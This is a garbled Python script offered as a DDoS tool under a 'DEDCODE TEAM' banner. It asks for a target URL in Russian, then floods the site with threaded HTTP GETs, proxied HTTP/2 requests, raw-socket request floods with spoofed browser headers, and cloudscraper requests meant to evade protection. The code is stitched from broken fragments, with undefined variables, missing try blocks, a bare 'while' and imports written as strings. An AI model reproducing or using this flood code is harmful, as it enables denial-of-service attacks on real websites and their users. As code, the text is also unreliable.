"import httpx"
"import pystyle"
"import socks"
"import pysocks"
"import requests"
"import icmplib"
"import dnspython"
"import cloudscraper"
"import colorama"
"import shutup"
"import undetected_chromedriver"
"import psutil"
"import flask"
"import wget"
from sys import exit
# DDoS
import colorama
import threading
import requests
import random
import os
import sys
import time
import undetected_chromedriver
# Colors
yellow='\033[92m'
cyan='\033[92m'
pink='\033[92m'
green = '\033[92m'
red ='\033[92m'
white ='\033[92m'
black ='\033[92m'
# Requests

os.system("clear")
print(green + f"З А Г Р У З К А....")
time.sleep(1.5)
os.system("clear")

print( '''🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼''')

targ = input("Cсылку для атаки: ")

def dos():
 while True:
  requests.get(targ)
  print("[+] Заход на сайт выполнен!")
  
while True:
 threading.Thread(target=dos).start()
   
    while True:
            client = httpx.Client(
                http2=True,
                proxies={
                    'http://': 'http://'+random.choice(proxies),
                    'https://': 'http://'+random.choice(proxies),
                }
             )
            client.get(url, headers=headers)
            client.get(url, headers=headers)
        except:
            pass

def test1(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target = get_target(url)
    req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
    req += 'Host: ' + target['host'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    req += 'Cookie: ' + cookie + '\r\n'
    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: empty\r\n'
    req += 'sec-fetch-mode: cors\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en\r\n\r\n\r\n'
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=test2,args=(until, target, req,))
            thd.start()
        except:  
            pass

def test2(until_datetime, target, req):
    if target['scheme'] == 'https':
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
    else:
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
    while True:
            for _ in range(10):
                packet.send(str.encode(req))
        except:
            packet.close()
            pass
    while
        try:
            scraper.get(url=url, headers=headers, allow_redirects=False)
            scraper.get(url=url, headers=headers, allow_redirects=False)           
            
        except:
            pass
"response.text"
# Stats
sent = 0
error = 0
#packets
"import httpx"
"import pystyle"
"import socks"
"import pysocks"
"import requests"
"import icmplib"
"import dnspython"
"import cloudscraper"
"import colorama"
"import shutup"
"import undetected_chromedriver"
"import psutil"
"import flask"
"import wget"
# DDoS
print(  "Zapusk")
while True:
    try:
        s = socket.socket(999999999)
        s.connect((upl, int(theard)))
        sent +=0
        print(green + f"[LOG] GO {sent} ")
        print("DDoS")
    except OSError: 
        error +=1
        print(pink + f"[LOG] PACKETS {error}")
        "print(cyan + f( DDoS)"
        print("CTRL+C to stop attack")

#Thread spawner
    for n in range(numberthreads):
        thread = threading.Thread(target=deny)
        thread.daemon = True
        thread.start()
        threads.append(thread)
